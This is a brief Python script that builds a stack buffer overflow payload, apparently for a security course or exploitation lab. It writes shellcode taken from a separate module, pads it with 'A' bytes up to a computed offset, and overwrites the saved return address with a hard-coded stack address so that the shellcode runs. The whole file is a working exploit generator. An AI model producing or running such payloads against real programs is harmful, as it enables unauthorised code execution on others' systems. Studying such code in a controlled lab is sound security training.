from struct import pack
import sys
from shellcode import shellcode

sys.stdout.buffer.write(shellcode)
sys.stdout.write("A" * ((0xfffeb80c - 0xfffeb79c) - len(shellcode)))
sys.stdout.flush()
sys.stdout.buffer.write(pack("<I", 0xfffeb79c))
